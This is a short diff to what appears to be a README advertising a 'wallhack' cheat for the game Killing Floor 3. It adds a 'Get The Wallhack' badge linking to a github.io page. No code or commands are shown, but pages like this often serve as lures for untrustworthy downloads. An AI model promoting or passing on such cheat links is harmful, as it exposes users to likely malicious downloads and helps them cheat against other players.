@@ -3,7 +3,7 @@
 **Article Description:**
 The chaos of **Killing Floor 3** can hit from any direction. But with a **wallhack**, you’ll see every Zed before it’s anywhere near you—turning ambushes into easy preemptive strikes.
 
-
+[![Get](https://img.shields.io/badge/Get%20The-Wallhack-blueviolet)](https://killing-floor-3-wallhack.github.io/.github/)
 ---
 
 ## **Product Description**
